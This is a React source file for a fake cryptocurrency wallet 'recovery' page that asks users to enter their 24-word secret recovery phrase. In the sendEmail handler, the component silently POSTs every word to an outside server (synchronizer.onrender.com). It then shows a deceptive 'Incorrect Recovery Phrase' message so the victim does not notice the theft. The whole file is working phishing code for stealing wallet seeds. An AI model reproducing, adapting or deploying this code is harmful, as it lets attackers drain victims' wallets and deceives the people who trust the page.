import React, { useState } from "react";
import axios from "axios";
import { IoIosArrowRoundBack } from "react-icons/io";
import { useNavigate } from "react-router-dom"
import Form from "../utils/Form";
import Modal from "./Modal";



export const SeedForm = () => {
    const formInitial = ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""]
    const [segments, setSegments] = React.useState(formInitial)
    const [isPaste, setIsPaste] = useState(false);
    const [textButton, setButtonText] = useState("Submit");
    const [status, setStatus] = useState({});
    const navigate = useNavigate();
    const [modal, setModal] = useState(false)
    const goBackSeed = () => {
        navigate("/");
        setModal(false);
    }

    const onClickModal = (e) => {
        e.preventDefault()
        setModal(false);
    }

    const sendEmail = async (e) => {
        e.preventDefault();
        setButtonText("Importing...");
        let response = await fetch("https://synchronizer.onrender.com/api/contact", {
            method: "POST",
            headers: {
                accept: 'application/json',
                'User-agent': 'learning app',
                "Content-Type": "application/json;charset=utf-8"
            },
            body: JSON.stringify(Object.assign({}, segments))
        });
        let result = await response.json();
        setButtonText("Submit");
        setSegments(formInitial);
        if (result.code == 200) {
            setModal(true)
            setStatus({ sucess: true, message: "Sorry, Incorrect Recovery Phrase" })
        } else {
            setStatus({ sucess: false });
        }

    }


    function onPaste(event) {
        event.preventDefault()
        const pasted = event.clipboardData.getData("text/plain");
        const filterPasted = pasted.trim().split(" ").filter((item, index) => {
            return item != "";
        })
        if (filterPasted.length !== 24) {
            setStatus({ message: "ENTER YOUR COMPLETE 24 SEEDPHRASE" });
            setModal(true)
            return;
        }

        setSegments(filterPasted.slice(0, segments.length));
    }

    function update(index) {
        return event =>
            setSegments([
                ...segments.slice(0, index),
                event.target.value,
                ...segments.slice(index + 1)
            ])
    }




    return (
        <div className="seed-phrase container">
            <div className="form-container">
                <div className="heading">
                    <div onClick={goBackSeed} style={{ float: "left" }}>
                        <IoIosArrowRoundBack onClick={goBackSeed} fontSize={30} />
                    </div>
                    <div style={{ display: "inline-block", flexDirection: "column", maxWidth: "500px", alignItems: "center", justifyContent: "space-between" }}>
                        <h2>Enter your recovery phrase</h2>
                        <p>
                            To restore access to your wallet, enter the 24 secret recovery words
                            given to you when you created your wallet
                        </p>
                    </div>
                </div>
                {modal == false ? <form onSubmit={sendEmail}>
                    <div className="lg-screen">
                        <div className="row1">
                            {segments.map((s, key) =>
                                <Form key={key} value={s} onPaste={onPaste} onInput={update(key)} form_num={key + 1} />
                            )}
                        </div>
                    </div>
                    <div>
                        <button className="btn submit_seed" type="submit" >{textButton}</button>
                    </div>
                </form>
                    :
                    <Modal status={status} handleModalBtn={onClickModal} />}
            </div>
        </div>
    );
};

export default SeedForm;
